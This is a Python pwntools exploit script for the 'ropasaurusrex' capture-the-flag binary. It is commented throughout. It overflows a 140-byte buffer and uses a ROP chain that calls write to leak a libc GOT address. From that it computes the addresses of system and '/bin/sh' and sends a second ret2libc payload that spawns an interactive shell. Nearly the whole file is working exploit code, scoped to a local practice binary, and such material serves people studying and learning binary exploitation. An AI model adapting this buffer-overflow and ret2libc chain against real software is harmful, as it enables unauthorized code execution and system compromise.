from pwn import *
import time

# This challenge consists in a buffer overflow, ROP and ret2libc exploit where we use a gadget to execute a write to leak a libc address that is then used to calculate the addresses of system and /bin/sh
# of the libc to finally spawn a shell.

context.terminal = ['tmux', 'splitw', '-h']

# Env attributed to use the given version of libc
r = process("./ropasaurusrex", env={'LD_PRELOAD': './libc-2.27.so'})
gdb.attach(r, """
	b *0x0804841c
	c
	""")

input("wait")

#found in ghidra by searching for "write"
write = 0x0804830c
#arg1 : file descriptor
arg1 = 1
#arg2 : what to print -> g.o.t. value of a libc function, for example the write 
arg2 = 0x08049614
#arg3 : number of bytes to print
arg3 = 4

#we take a gadget with 3 pops from ROPgadget
pop3 = 0x080484b6

#p32(0x080483f4) is the address of the function in the binary that executes a read, so we jump back there to have another read and split our payload
payload = p32(write) + p32(pop3) + p32(arg1) + p32(arg2) + p32(arg3) + p32(0x80483f4)

# make the rop been executed by overwriting the sEIP exploiting a buffer overflow
r.send(b"A"*140 + payload)

# save the value of the leaked libc address
write_got = u32(r.recv(4))

# compute the base address of libc
libc_base = write_got - 0xe6d80

# compute the address of system of libc
system = libc_base + 0x3d200

# compute the address of /bin/sh of libc
binsh = libc_base + 0x17e0cf

print("[!] write_got: 0x%08x" % write_got)
print("[!] libc_base: 0x%08x" % libc_base)
print("[!] system: 0x%08x" % system)
print("[!] binsh: 0x%08x" % binsh)

time.sleep(0.1)

# send the payload to spawn a shell, this is red by the read where we jumped with the previous payload
payload2 = p32(system) + b"BBBB" + p32(binsh)


r.send(b"A"*140 + payload2)

r.interactive()

